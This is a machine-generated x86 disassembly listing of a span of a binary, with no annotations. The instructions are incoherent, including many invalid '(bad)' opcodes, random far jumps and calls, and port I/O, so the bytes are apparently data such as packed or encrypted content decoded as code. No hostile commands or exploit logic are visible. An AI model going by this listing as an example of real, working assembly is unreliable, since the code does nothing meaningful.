  42cb2e:	sbb    eax,0xece2a307
  42cb33:	aas    
  42cb34:	pop    ss
  42cb35:	xor    eax,ebx
  42cb37:	(bad)  
  42cb38:	push   ds
  42cb39:	jmp    0x1099:0x3f518b7b
  42cb40:	push   edx
  42cb41:	mov    al,BYTE PTR [eax-0x67]
  42cb44:	dec    esi
  42cb45:	sub    al,0xad
  42cb47:	or     edi,DWORD PTR cs:[esi-0x30d8998c]
  42cb4e:	in     eax,dx
  42cb4f:	pop    ds
  42cb50:	mov    esp,DWORD PTR [edx-0x72]
  42cb53:	fiadd  WORD PTR [edi]
  42cb55:	pusha  
  42cb56:	pop    esi
  42cb57:	test   DWORD PTR [ebx+0x55],esi
  42cb5a:	leave  
  42cb5b:	push   eax
  42cb5c:	add    DWORD PTR [ebx+edx*2],ecx
  42cb5f:	mov    edx,0x7fddecea
  42cb64:	scas   al,BYTE PTR es:[edi]
  42cb65:	loop   0x42cbd7
  42cb67:	sub    dl,BYTE PTR [edi-0x7a]
  42cb6a:	or     bl,BYTE PTR [eax]
  42cb6c:	daa    
  42cb6d:	lea    ebx,ds:0x80d69bde
  42cb73:	ss cdq 
  42cb75:	cdq    
  42cb76:	pushf  
  42cb77:	push   cs
  42cb78:	inc    ebp
  42cb79:	call   0x5160880e
  42cb7e:	pop    esi
  42cb7f:	pop    ds
  42cb80:	sub    al,0xae
  42cb82:	add    al,0x62
  42cb84:	cmp    eax,0x1a025c14
  42cb89:	test   DWORD PTR [ecx+0x5d51df8c],0xde311bd6
  42cb93:	mov    bl,0x8c
  42cb95:	pusha  
  42cb96:	repz (bad) 
  42cb98:	stc    
  42cb99:	mov    cl,BYTE PTR [edx]
  42cb9b:	mov    eax,ds:0x64e15128
  42cba0:	push   esp
  42cba1:	(bad)  
  42cba2:	aaa    
  42cba3:	aas    
  42cba4:	cwde   
  42cba5:	mov    DWORD PTR [esi-0x2],0x13d0614
  42cbac:	pusha  
  42cbad:	gs mov esp,0x4ccf5775
  42cbb3:	and    esp,DWORD PTR [ebx+edi*2]
  42cbb6:	xchg   DWORD PTR ss:[esi+0x4c810559],edi
  42cbbd:	(bad)  
  42cbbe:	popf   
  42cbbf:	adc    esp,DWORD PTR [eax-0x1f]
  42cbc2:	daa    
  42cbc3:	popf   
  42cbc4:	mov    ah,0x0
  42cbc6:	mov    ah,0x7e
  42cbc8:	aad    0xe6
  42cbca:	iret   
  42cbcb:	test   DWORD PTR [ebp-0x13],esi
  42cbce:	pop    es
  42cbcf:	fwait
  42cbd0:	nop
  42cbd1:	pop    esi
  42cbd2:	pop    ebx
  42cbd3:	scas   al,BYTE PTR es:[edi]
  42cbd4:	pop    ebp
  42cbd5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42cbd6:	fst    DWORD PTR [esi+0x41]
  42cbd9:	int    0xa9
  42cbdb:	dec    esp
  42cbdc:	fimul  WORD PTR [esi+0x3bc63111]
  42cbe2:	xor    DWORD PTR [ebx+0x2e],ecx
  42cbe5:	dec    ecx
  42cbe6:	add    al,0xb3
  42cbe8:	clc    
  42cbe9:	adc    ah,BYTE PTR [ecx]
  42cbeb:	out    dx,eax
  42cbec:	call   0x29d839d2
  42cbf1:	mov    bh,0xd1
  42cbf3:	and    al,BYTE PTR [ebx]
  42cbf5:	xchg   ebp,eax
  42cbf6:	adc    al,0xd5
  42cbf8:	xchg   esp,eax
  42cbf9:	popf   
  42cbfa:	aas    
  42cbfb:	cmp    eax,0xc21f9723
  42cc00:	sar    bl,cl
  42cc02:	lea    eax,[eax+0x19e49e2]
  42cc08:	ja     0x42cbdd
  42cc0a:	pop    ecx
  42cc0b:	arpl   WORD PTR [ecx+0x76],cx
  42cc0e:	scas   al,BYTE PTR es:[edi]
  42cc0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
	...
  42cc74:	jg     0x42cc78
  42cc76:	mov    esp,DWORD PTR [edi+edi*8-0x13]
  42cc7a:	call   FWORD PTR [ebx]
  42cc7c:	fisttp WORD PTR [ebp+0x1]
  42cc7f:	or     eax,0xdfb884c0
  42cc84:	add    bh,bl
  42cc86:	add    DWORD PTR [eax],eax
  42cc88:	add    al,0x1
  42cc8a:	add    BYTE PTR [eax],al
  42cc8c:	xor    eax,edx
  42cc8e:	pop    ss
  42cc8f:	xchg   DWORD PTR [esi],ecx
  42cc91:	bound  eax,QWORD PTR [edi-0x23]
  42cc94:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  42cc96:	hlt    
  42cc97:	hlt    
  42cc98:	jle    0x42cc7c
  42cc9a:	pop    ebp
  42cc9b:	(bad)  
  42cc9d:	ins    DWORD PTR es:[edi],dx
  42cc9e:	jbe    0x42ccd0
  42cca0:	stos   BYTE PTR es:[edi],al
  42cca1:	pop    edx
  42cca2:	sar    DWORD PTR [edx+0x4407e283],1
  42cca8:	cmp    bh,BYTE PTR [eax]
  42ccaa:	jbe    0x42cc8a
  42ccac:	lock mov esp,0x1fc880d4
  42ccb2:	aas    
  42ccb3:	or     al,0xb2
  42ccb5:	pop    esp
  42ccb6:	xlat   BYTE PTR ds:[ebx]
  42ccb7:	call   FWORD PTR [esi+0x6c28180b]
  42ccbd:	xor    dl,BYTE PTR [eax]
  42ccbf:	sub    ah,BYTE PTR ds:0xaed03f27
  42ccc5:	in     al,0x95
  42ccc7:	retf   
  42ccc8:	adc    eax,0xf234375c
  42cccd:	xlat   BYTE PTR ds:[ebx]
  42ccce:	mov    DWORD PTR [esi-0x78fcc65],0x8edaf17f
  42ccd8:	arpl   WORD PTR [ebp+0x4c],di
  42ccdb:	mov    dh,0x1f
  42ccdd:	cs inc edi
  42ccdf:	cmp    al,0x16
  42cce1:	xor    BYTE PTR [ebx],ch
  42cce3:	lea    edi,[esi]
  42cce5:	pop    ebp
  42cce6:	out    dx,al
  42cce7:	push   ebp
  42cce8:	lea    ebp,[ebx]
  42ccea:	push   ecx
  42cceb:	dec    esi
  42ccec:	(bad)  
  42cced:	pop    esi
  42ccee:	sti    
  42ccef:	xchg   ebx,eax
  42ccf0:	dec    ecx
  42ccf1:	mov    gs,WORD PTR [edi+esi*8]
  42ccf4:	or     eax,0xb2dcda80
  42ccf9:	inc    ecx
  42ccfa:	(bad)  
  42ccfb:	adc    al,al
  42ccfd:	pusha  
  42ccfe:	in     al,dx
  42ccff:	(bad)  
  42cd00:	fwait
  42cd01:	in     eax,0xc3
  42cd03:	or     BYTE PTR [ebx+ebx*8-0x41],bl
  42cd07:	shr    BYTE PTR ds:0x1d7f7a45,0x6a
  42cd0e:	dec    ebp
  42cd0f:	out    0x71,eax
  42cd11:	jg     0x42cca6
  42cd13:	push   0xe0479916
  42cd18:	mov    edx,0xca784a02
  42cd1d:	jg     0x42cd8d
  42cd1f:	fistp  DWORD PTR [eax+0x1f]
  42cd22:	mov    esi,0x2202965c
  42cd27:	cwde   
  42cd28:	loopne 0x42cd80
  42cd2a:	stos   DWORD PTR es:[edi],eax
  42cd2b:	sbb    al,0xd6
  42cd2d:	push   ecx
  42cd2e:	push   ds
  42cd2f:	sbb    esp,ebx
  42cd31:	leave  
  42cd32:	lahf   
  42cd33:	xchg   ebx,eax
  42cd34:	sub    BYTE PTR [eax+0x49],dh
  42cd37:	and    eax,0x5cbc973b
  42cd3c:	fdivr  QWORD PTR [esi]
  42cd3e:	test   al,0x74
  42cd40:	push   es
  42cd41:	jno    0x42cce5
  42cd43:	jno    0x42ccd2
  42cd45:	aas    
  42cd46:	adc    al,0x6b
  42cd48:	sbb    al,0xaa
  42cd4a:	leave  
  42cd4b:	shr    BYTE PTR [ecx+0x6f],1
  42cd4e:	popa   
  42cd4f:	mov    dl,0xd2
  42cd51:	dec    edx
  42cd52:	and    cl,BYTE PTR [ecx+0x23d8d76a]
  42cd58:	add    eax,0x79b0fbe8
  42cd5d:	ins    DWORD PTR es:[edi],dx
  42cd5e:	inc    ebx
  42cd5f:	sbb    ecx,DWORD PTR [ebp-0x75831b0f]
  42cd65:	imul   eax,DWORD PTR [ebx],0x112c73fb
  42cd6b:	arpl   WORD PTR [eax],bx
  42cd6d:	push   ebx
  42cd6e:	ret    0x4d7f
  42cd71:	test   ebx,ebx
  42cd73:	fwait
  42cd74:	jne    0x42cdec
  42cd76:	sbb    DWORD PTR [ebp-0x7014f55d],0xffffff93
  42cd7d:	sbb    edx,DWORD PTR [edi+0x72e90a7b]
  42cd83:	xor    eax,0xe8a92f2c
  42cd88:	cmp    al,0x3d
  42cd8a:	out    0x48,al
  42cd8c:	(bad)  
  42cd8d:	cwde   
  42cd8e:	mov    ah,BYTE PTR [ecx+0x0]
	...
  42cdf4:	sbb    DWORD PTR [ecx-0x20017802],esp
  42cdfa:	jns    0x42cdbb
  42cdfc:	xchg   BYTE PTR [esi],dh
  42cdfe:	xchg   esi,eax
  42cdff:	mov    ch,0xdb
  42ce01:	pop    ebp
  42ce02:	sar    DWORD PTR [esp+eax*1+0x40001e0],cl
  42ce09:	add    DWORD PTR [eax],eax
  42ce0b:	add    BYTE PTR [ebx+0x75],bh
  42ce0e:	lea    ebx,[esi]
  42ce10:	xor    BYTE PTR [ecx+0x48],ah
  42ce13:	or     eax,0xa6a5e7e6
  42ce18:	xchg   esp,eax
  42ce19:	push   ss
  42ce1a:	das    
  42ce1b:	ret    0x6b3a
  42ce1e:	inc    ecx
  42ce1f:	mov    DWORD PTR [ecx+edx*4-0x2e],ecx
  42ce23:	addr16 inc eax
  42ce25:	inc    esi
  42ce26:	fisub  DWORD PTR [ebx+0x52b2f66c]
  42ce2c:	outs   dx,DWORD PTR ds:[esi]
  42ce2d:	cmp    eax,0x67633f99
  42ce32:	loop   0x42cdc3
  42ce34:	std    
  42ce35:	imul   ebp,DWORD PTR [ecx],0xffffffbc
  42ce38:	and    BYTE PTR [edx+0x7801cc82],al
  42ce3e:	ds in  al,dx
  42ce40:	dec    ebp
  42ce41:	inc    ebx
  42ce42:	aas    
  42ce43:	pop    eax
  42ce44:	cmp    DWORD PTR [ebp-0xb],ebp
  42ce47:	imul   BYTE PTR [edx+0x1b]
  42ce4a:	pop    esp
  42ce4b:	inc    ecx
  42ce4c:	aam    0x1a
  42ce4e:	cmp    al,0xe1
  42ce50:	mov    esi,0x21dac39d
  42ce55:	cmp    BYTE PTR ds:0x4d55de96,dh
  42ce5b:	dec    eax
  42ce5c:	xor    eax,0xa3ab7e17
  42ce61:	mov    bl,0x98
  42ce63:	int3   
  42ce64:	stos   BYTE PTR es:[edi],al
  42ce65:	stc    
  42ce66:	(bad)  
  42ce67:	test   BYTE PTR [ebx+0xe],bh
  42ce6a:	aad    0xf4
  42ce6c:	jl     0x42ceb6
  42ce6e:	and    edi,DWORD PTR [edx]
  42ce70:	pop    edi
  42ce71:	out    0x73,al
  42ce73:	in     al,dx
  42ce74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ce75:	xor    al,0x87
  42ce77:	push   esi
  42ce78:	inc    ebx
  42ce79:	test   al,0xe2
  42ce7b:	adc    ebp,eax
  42ce7d:	push   cs
  42ce7e:	adc    dl,BYTE PTR [ebx-0x4c03b1eb]
  42ce84:	call   0xc63da26
  42ce89:	sbb    DWORD PTR [ebx-0x8],0x28bbe6e
  42ce90:	cdq    
  42ce91:	mov    ds:0xbd89d6c2,al
  42ce96:	adc    al,0x3a
  42ce98:	pusha  
  42ce99:	std    
  42ce9a:	arpl   si,si
  42ce9c:	out    0x48,eax
  42ce9e:	jno    0x42ce62
  42cea0:	add    eax,DWORD PTR [ebp+0x225143fd]
  42cea6:	int    0x85
  42cea8:	imul   ebx,DWORD PTR [edx-0x117a7d7f],0x18
  42ceaf:	mov    bh,0x97
  42ceb1:	mov    ecx,0x8263e95
  42ceb6:	popa   
  42ceb7:	test   BYTE PTR [esi+0x2ed501d],0xf1
  42cebe:	pop    esp
  42cebf:	fld    DWORD PTR [eax-0x78818cb]
  42cec5:	and    DWORD PTR [esi-0x1469d979],esp
  42cecb:	lea    ebp,[esi]
  42cecd:	arpl   di,di
  42cecf:	push   edx
  42ced0:	test   al,0xf
  42ced2:	xchg   BYTE PTR [edx],al
  42ced4:	push   ebx
  42ced5:	dec    ecx
  42ced6:	loop   0x42ce8b
  42ced8:	push   ebx
  42ced9:	cmp    cl,BYTE PTR [ebx+0x21b6d99e]
  42cedf:	cmp    BYTE PTR [esi-0x42],cl
  42cee2:	or     al,0x1b
  42cee4:	ret    0x7bd0
  42cee7:	idiv   BYTE PTR [ecx]
  42cee9:	frstor [ecx-0x38]
  42ceec:	adc    DWORD PTR [ebp-0x38],eax
  42ceef:	enter  0xd32,0x29
  42cef3:	lock lods al,BYTE PTR ds:[esi]
  42cef5:	xor    eax,0x12f0b709
  42cefa:	push   ss
  42cefb:	es sbb ch,al
  42cefe:	frstor [eax-0x1c]
  42cf01:	call   FWORD PTR [edi]
  42cf03:	jp     0x42ced6
  42cf05:	push   edx
  42cf06:	pusha  
  42cf07:	ds cli 
  42cf09:	mov    dh,0xe9
  42cf0b:	add    al,0xb8
  42cf0d:	loope  0x42ceee
  42cf0f:	add    BYTE PTR fs:[eax],al
	...
  42cf72:	add    BYTE PTR [eax],al
  42cf74:	jae    0x42cfb3
  42cf76:	fadd   st,st(1)
  42cf78:	fsubrp st(5),st
  42cf7a:	jnp    0x42cf3b
  42cf7c:	or     al,BYTE PTR [esi]
  42cf7e:	cld    
  42cf7f:	(bad)  
  42cf80:	shl    BYTE PTR [ecx-0x67],cl
  42cf83:	jns    0x42cf8d
  42cf85:	loope  0x42cf88
  42cf87:	add    BYTE PTR [ecx+eax*1],al
  42cf8a:	add    BYTE PTR [eax],al
  42cf8c:	mov    BYTE PTR [ebx],dl
  42cf8e:	daa    
  42cf8f:	dec    ebx
  42cf90:	inc    esp
  42cf91:	mov    gs:0x3dd659c4,al
  42cf97:	test   bh,bl
  42cf99:	lods   al,BYTE PTR ds:[esi]
  42cf9a:	fimul  DWORD PTR [edi+0x2a18284f]
  42cfa0:	adc    al,0x57
  42cfa2:	xchg   ebp,eax
  42cfa3:	inc    esp
  42cfa4:	scas   eax,DWORD PTR es:[edi]
  42cfa5:	inc    edi
  42cfa6:	mov    ss,WORD PTR [esi]
  42cfa8:	pop    es
  42cfa9:	inc    ecx
  42cfaa:	retf   0x9ac
  42cfad:	ss outs dx,BYTE PTR ss:[esi]
  42cfb0:	mov    DWORD PTR [edx-0x4f],ecx
  42cfb3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42cfb4:	xor    BYTE PTR [ecx+0x64e55cf5],ch
  42cfba:	jp     0x42d039
  42cfbc:	xchg   ecx,eax
  42cfbd:	int3   
  42cfbe:	add    al,BYTE PTR ds:0xc3a46be2
  42cfc4:	out    dx,al
  42cfc5:	push   0xb9379a7a
  42cfca:	push   esi
  42cfcb:	jle    0x42cfae
  42cfcd:	mov    edi,0x6f45c740
  42cfd2:	push   ecx
  42cfd3:	inc    esp
  42cfd4:	inc    ecx
  42cfd5:	into   
  42cfd6:	mov    dh,0x86
  42cfd8:	imul   esi,DWORD PTR [esi-0x2a61d6d],0x7c270a93
  42cfe2:	fidiv  WORD PTR [ebx+ecx*4-0x4e]
  42cfe6:	push   es
  42cfe7:	adc    eax,0x6dd09f2d
  42cfec:	xor    ebx,DWORD PTR [eax+eax*1-0x7cad2b7e]
  42cff3:	pop    edi
  42cff4:	sub    BYTE PTR [edx-0x3bc434ca],cl
  42cffa:	aam    0xc5
  42cffc:	in     al,dx
  42cffd:	and    DWORD PTR [edx-0x39c4df46],ebx
  42d003:	dec    ebp
  42d004:	and    BYTE PTR ss:[edi],bl
  42d007:	cwde   
  42d008:	sbb    BYTE PTR [eax],cl
  42d00a:	ret    
  42d00b:	jge    0x42cfe4
  42d00d:	push   ecx
  42d00e:	sbb    ecx,DWORD PTR [ecx]
  42d010:	sub    edx,eax
  42d012:	ret    0x5d17
  42d015:	push   0x66d65421
  42d01a:	lock ds jnp 0x42d00d
  42d01e:	fisttp QWORD PTR [ecx+0x3]
  42d021:	in     eax,0x88
  42d023:	out    dx,eax
  42d024:	jae    0x42cff3
  42d026:	sbb    ebp,0x91948f97
  42d02c:	pop    es
  42d02d:	inc    ebx
  42d02f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d030:	aam    0x37
  42d032:	fild   DWORD PTR [eax-0x4df64eff]
  42d038:	call   0xbb48893d
  42d03d:	add    eax,0xceb7f949
  42d042:	jl     0x42d04b
  42d044:	dec    edi
  42d045:	les    edi,FWORD PTR [ecx-0x657f8352]
  42d04b:	fild   DWORD PTR ss:[ebp+edi*1-0x6d]
  42d050:	sbb    edx,DWORD PTR [esi+0x4e]
  42d053:	xor    ebp,eax
  42d055:	stc    
  42d056:	jae    0x42d02d
  42d058:	jmp    0x273a7d8a
  42d05d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d05e:	jb     0x42d067
  42d060:	dec    ecx
  42d061:	sub    eax,0x19978bc0
  42d066:	jno    0x42d09b
  42d068:	hlt    
  42d069:	repz mov cl,0x47
  42d06c:	inc    ebp
  42d06d:	cli    
  42d06e:	retf   0xc9ce
  42d071:	jge    0x42d09f
  42d073:	rcr    ch,0x8f
  42d076:	xor    dl,BYTE PTR [esp+edi*1+0x0]
  42d07a:	cmovl  eax,DWORD PTR [ebx]
  42d07d:	sbb    eax,0xfd0c03f1
  42d082:	sti    
  42d083:	xchg   ebp,eax
  42d084:	dec    ebp
  42d085:	les    eax,FWORD PTR [edx+0x60]
  42d088:	cmp    ch,BYTE PTR [ecx+0x1b174478]
  42d08e:	dec    edx
  42d08f:	inc    ebx
	...
  42d0f4:	push   eax
  42d0f5:	cmp    al,dh
  42d0f7:	sub    al,0xee
  42d0f9:	cld    
  42d0fa:	cli    
  42d0fb:	jle    0x42d090
  42d0fd:	dec    esp
  42d0fe:	nop
  42d0ff:	xor    BYTE PTR [ecx+0x65],dl
  42d102:	add    BYTE PTR [eax],ah
  42d104:	or     al,0xe2
  42d106:	add    DWORD PTR [eax],eax
  42d108:	add    al,0x1
  42d10a:	add    BYTE PTR [eax],al
  42d10c:	add    dl,al
  42d10e:	ja     0x42d0b7
  42d110:	sti    
  42d111:	(bad)  
  42d112:	xchg   edx,eax
  42d113:	inc    esi
  42d114:	test   al,0x82
  42d116:	das    
  42d117:	enter  0x1fa5,0x62
  42d11b:	mov    eax,0xad629928
  42d120:	mov    eax,edi
  42d122:	retf   0x3f33
  42d125:	out    0x2c,eax
  42d127:	fist   WORD PTR [ebx-0x265a263b]
  42d12d:	je     0x42d188
  42d12f:	pop    ebx
  42d130:	jbe    0x42d190
  42d132:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d133:	cmp    DWORD PTR [edx],0x77
  42d136:	ins    DWORD PTR es:[edi],dx
  42d137:	push   esp
  42d138:	pop    es
  42d139:	jmp    0x42d16d
  42d13b:	(bad)  
  42d13c:	icebp  
  42d13d:	sbb    ah,dh
  42d13f:	in     eax,dx
  42d140:	ja     0x42d179
  42d142:	call   0x27dc:0xb8f837c8
  42d149:	push   cs
  42d14a:	jbe    0x42d13a
  42d14c:	mov    DWORD PTR [edi+ecx*4],ecx
  42d14f:	mov    ds:0x772ce330,eax
  42d154:	cmp    edx,DWORD PTR [ebp-0x61a2308f]
  42d15a:	std    
  42d15b:	dec    edx
  42d15c:	inc    ebp
  42d15d:	push   esp
  42d15e:	dec    ebx
  42d160:	push   esi
  42d161:	xor    bh,bh
  42d163:	adc    al,0x72
  42d165:	jne    0x42d165
  42d167:	add    eax,0x58af3cdb
  42d16c:	imul   edx,edx,0xffffff88
  42d16f:	aaa    
  42d170:	mov    ebp,0x9173335d
  42d175:	push   0x5b
  42d177:	mov    cl,al
  42d179:	rcr    ecx,1
  42d17b:	out    dx,eax
  42d17c:	cs pop ss
  42d17e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d17f:	jae    0x42d193
  42d181:	sub    eax,0xd78d998f
  42d186:	xchg   DWORD PTR [eax+0x59],esp
  42d189:	stc    
  42d18a:	into   
  42d18b:	or     DWORD PTR ds:0xca8fe57c,edx
  42d191:	bound  ebx,QWORD PTR [eax+0x5e590384]
  42d197:	xchg   edx,eax
  42d198:	(bad)  
  42d199:	sbb    bh,ch
  42d19b:	aaa    
  42d19c:	pop    ebx
  42d19d:	mov    cl,0xbf
  42d19f:	into   
  42d1a0:	(bad)  
  42d1a1:	jp     0x42d1c1
  42d1a3:	add    eax,0xc4295081
  42d1a8:	xor    eax,0x1a43d73a
  42d1ad:	retf   0x7e54
  42d1b0:	jmp    0x42d20c
  42d1b2:	ins    DWORD PTR es:[edi],dx
  42d1b3:	cmp    DWORD PTR [ebx-0x55e82def],0x9c8a8816
  42d1bd:	xor    eax,0xe78a8fe2
  42d1c2:	out    dx,al
  42d1c3:	lahf   
  42d1c4:	les    esi,FWORD PTR [ebp+0x36]
  42d1c7:	sub    ah,dh
  42d1c9:	cmp    eax,0x994a6f4b
  42d1ce:	(bad)  
  42d1cf:	retf   0x7ae8
  42d1d2:	jmp    0x42d1ee
  42d1d4:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  42d1d6:	aas    
  42d1d7:	jp     0x42d20b
  42d1d9:	ins    BYTE PTR es:[edi],dx
  42d1da:	test   DWORD PTR [ebp+0xd],0xe0b5cd04
  42d1e1:	adc    DWORD PTR [edi+0x77],0x10
  42d1e5:	inc    edx
  42d1e6:	sub    eax,DWORD PTR [edx]
  42d1e8:	bound  ebx,QWORD PTR [edi-0x232fc63a]
  42d1ee:	inc    esp
  42d1ef:	mov    bh,0xd5
  42d1f1:	cmp    DWORD PTR [edi-0x149a45e1],edx
  42d1f7:	ins    DWORD PTR es:[edi],dx
  42d1f8:	push   esi
  42d1f9:	xchg   ebx,eax
  42d1fa:	test   edi,ebx
  42d1fc:	inc    edi
  42d1fd:	imul   edi,ebx,0xd2a63fdb
  42d203:	loopne 0x42d185
  42d205:	push   ebp
  42d206:	add    cl,BYTE PTR [edi]
  42d208:	fcomp  QWORD PTR [esi+0x3c]
  42d20b:	cwde   
  42d20c:	jns    0x42d1e2
  42d20e:	cdq    
  42d20f:	inc    DWORD PTR [eax]
	...
  42d271:	add    BYTE PTR [eax],al
  42d273:	add    BYTE PTR [ebp-0x2289a2f8],cl
  42d279:	ja     0x42d22a
  42d27b:	sti    
  42d27c:	aaa    
  42d27d:	out    0x36,eax
  42d27f:	ja     0x42d2a1
  42d281:	out    dx,eax
  42d282:	push   esi
  42d283:	adc    DWORD PTR [eax],edx
  42d285:	jecxz  0x42d288
  42d287:	add    BYTE PTR [ecx+eax*1],al
  42d28a:	add    BYTE PTR [eax],al
  42d28c:	outs   dx,BYTE PTR ds:[esi]
  42d28d:	cwde   
  42d28e:	sbb    eax,0x52b8a151
  42d293:	mov    gs,WORD PTR [ecx+0x28d975c2]
  42d299:	adc    dl,BYTE PTR [esi+0x16d230a]
  42d29f:	fwait
  42d2a0:	pop    ss
  42d2a1:	in     eax,dx
  42d2a2:	mov    ds:0xc17daecd,al
  42d2a7:	mov    esi,0x3e85c06b
  42d2ac:	adc    DWORD PTR [ebx+0x6f],esi
  42d2af:	lea    edx,[eax]
  42d2b1:	fcomp  DWORD PTR [esi]
  42d2b3:	cld    
  42d2b4:	lods   al,BYTE PTR ds:[esi]
  42d2b5:	xor    dl,dl
  42d2b7:	jl     0x42d2e6
  42d2b9:	(bad)  [ebx]
  42d2bb:	mov    ch,0x81
  42d2bd:	jecxz  0x42d243
  42d2bf:	test   eax,0xc344602d
  42d2c4:	mov    ch,0x34
  42d2c6:	call   0xce27:0xb7017415
  42d2cd:	cdq    
  42d2ce:	out    dx,eax
  42d2cf:	shl    DWORD PTR [ebx+ebx*1],cl
  42d2d2:	int3   
  42d2d3:	inc    esi
  42d2d4:	outs   dx,DWORD PTR ds:[esi]
  42d2d5:	arpl   bx,di
  42d2d7:	neg    DWORD PTR [edx]
  42d2d9:	ins    DWORD PTR es:[edi],dx
  42d2da:	dec    ebx
  42d2db:	imul   edi,DWORD PTR [edi-0x7d],0x67
  42d2df:	retf   0xc3ea
  42d2e2:	push   ebp
  42d2e3:	adc    DWORD PTR [esi-0x53],0xf6786d39
  42d2ea:	adc    BYTE PTR [eax+0x36],ch
  42d2ed:	inc    DWORD PTR [esi+0x54d95d06]
  42d2f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d2f4:	xor    ebx,ebp
  42d2f6:	bound  eax,QWORD PTR [ebx]
  42d2f8:	lahf   
  42d2f9:	inc    eax
  42d2fa:	lea    ebp,[edx-0x226be060]
  42d300:	addr16 push cs
  42d302:	lds    edx,FWORD PTR [ebx-0x11]
  42d305:	inc    edx
  42d306:	pop    eax
  42d307:	lods   al,BYTE PTR ds:[esi]
  42d308:	shr    BYTE PTR ds:0x2ab48ad,cl
  42d30e:	popa   
  42d30f:	sub    al,0xd0
  42d311:	sub    eax,0x7e3984c0
  42d316:	xor    eax,0xf203c8c2
  42d31b:	aad    0xf7
  42d31d:	adc    BYTE PTR [ebx-0x6],ch
  42d320:	rcl    BYTE PTR [esi-0x79],cl
  42d323:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d324:	lods   al,BYTE PTR ds:[esi]
  42d325:	jg     0x42d2ee
  42d327:	push   ss
  42d328:	in     eax,0x3b
  42d32a:	mov    ah,0x7b
  42d32c:	or     BYTE PTR [eax-0x3c7242de],dl
  42d332:	aad    0xc9
  42d334:	scas   al,BYTE PTR es:[edi]
  42d335:	leave  
  42d336:	out    0x2b,eax
  42d338:	enter  0x77bc,0x99
  42d33c:	ins    BYTE PTR es:[edi],dx
  42d33d:	add    ecx,DWORD PTR [eax-0x19]
  42d340:	ret    
  42d341:	xlat   BYTE PTR ds:[ebx]
  42d342:	je     0x42d324
  42d344:	and    BYTE PTR [edi],0xff
  42d347:	inc    ebx
  42d348:	clc    
  42d349:	pop    es
  42d34a:	ffree  st(0)
  42d34c:	pop    ebp
  42d34d:	push   ebx
  42d34e:	xor    BYTE PTR [eax+0x7fe8024f],0xe0
  42d355:	push   0xf4029c78
  42d35a:	sti    
  42d35b:	jg     0x42d34a
  42d35d:	xor    DWORD PTR [ebp-0x64b8794d],ecx
  42d363:	ds push ebx
  42d365:	(bad)  
  42d366:	outs   dx,DWORD PTR ds:[esi]
  42d367:	js     0x42d3c8
  42d369:	push   0x54
  42d36b:	and    eax,0x2476e6ea
  42d370:	push   edi
  42d371:	aas    
  42d372:	dec    eax
  42d373:	add    bh,al
  42d375:	psubusb mm5,QWORD PTR [ecx+edx*4]
  42d379:	pushf  
  42d37a:	test   eax,esi
  42d37c:	mov    ebx,DWORD PTR [ebp+0x13ca5e]
  42d382:	pop    esi
  42d383:	js     0x42d358
  42d385:	enter  0x261,0x23
  42d389:	or     al,0x46
  42d38b:	lahf   
  42d38c:	jmp    FWORD PTR es:[ecx+ebx*4+0x0]
	...
  42d3f4:	ror    esi,0x63
  42d3f7:	cdq    
  42d3f8:	outs   dx,DWORD PTR ds:[esi]
  42d3f9:	mov    ebp,0x9459defb
  42d3fe:	aaa    
  42d3ff:	pushf  
  42d400:	mov    eax,0x14f6ac9f
  42d405:	in     al,0x1
  42d407:	add    BYTE PTR [ecx+eax*1],al
  42d40a:	add    BYTE PTR [eax],al
  42d40c:	sub    eax,0x8cfee4
  42d411:	sbb    ebx,DWORD PTR [ecx-0x7e]
  42d414:	jl     0x42d3b2
  42d416:	syscall 
  42d418:	cmp    ecx,ecx
  42d41a:	inc    ebp
  42d41b:	xor    DWORD PTR [ebp+0x6f4e992a],0xfffffff5
  42d422:	xchg   ecx,eax
  42d423:	call   0x20af:0x7887846
  42d42a:	xchg   edi,eax
  42d42b:	mov    dh,0x87
  42d42d:	sbb    al,0xdc
  42d42f:	ins    DWORD PTR es:[edi],dx
  42d430:	xor    al,0xd0
  42d432:	and    BYTE PTR [ebp+0x3e],bh
  42d435:	and    dl,dh
  42d437:	sub    eax,0x30eec9e1
  42d43c:	sbb    DWORD PTR [eax+ecx*4],esp
  42d43f:	mov    eax,DWORD PTR [eax+0x7aec6f28]
  42d445:	adc    ebx,DWORD PTR [ebp-0x57c11fa7]
  42d44b:	popa   
  42d44c:	cdq    
  42d44d:	jno    0x42d4af
  42d44f:	lea    ecx,[edi-0x24]
  42d452:	cmp    eax,0xb69fdba5
  42d457:	shr    bl,cl
  42d459:	cmp    esp,eax
  42d45b:	imul   ebp,DWORD PTR [ecx+ecx*2-0x7f529a2b],0x30
  42d463:	xchg   BYTE PTR [ebx],al
  42d465:	adc    eax,0x5ebf062b
  42d46a:	xor    bl,bl
  42d46c:	pop    edi
  42d46d:	(bad)  
  42d46e:	pushfw 
  42d470:	lods   eax,DWORD PTR ds:[esi]
  42d471:	popf   
  42d472:	imul   esp,DWORD PTR [ecx+0x6c1f81da],0x5a
  42d479:	xchg   edi,eax
  42d47a:	push   esi
  42d47b:	push   edx
  42d47c:	fisubr DWORD PTR [ecx-0x16da8938]
  42d482:	inc    ecx
  42d483:	ja     0x42d4e6
  42d485:	or     bl,BYTE PTR [esi]
  42d487:	sbb    eax,0xdc212bfc
  42d48c:	call   0xec4e1ba1
  42d491:	inc    ebx
  42d492:	cmp    al,0x45
  42d494:	and    eax,0xee196f2b
  42d499:	jp     0x42d4d2
  42d49b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d49c:	into   
  42d49d:	cld    
  42d49e:	loope  0x42d51b
  42d4a0:	mov    ds:0xf35842c4,al
  42d4a5:	pop    es
  42d4a6:	out    0x6,eax
  42d4a8:	mov    bh,0xa4
  42d4aa:	nop
  42d4ab:	call   0xbd785b0f
  42d4b0:	xchg   edi,eax
  42d4b1:	mov    eax,edi
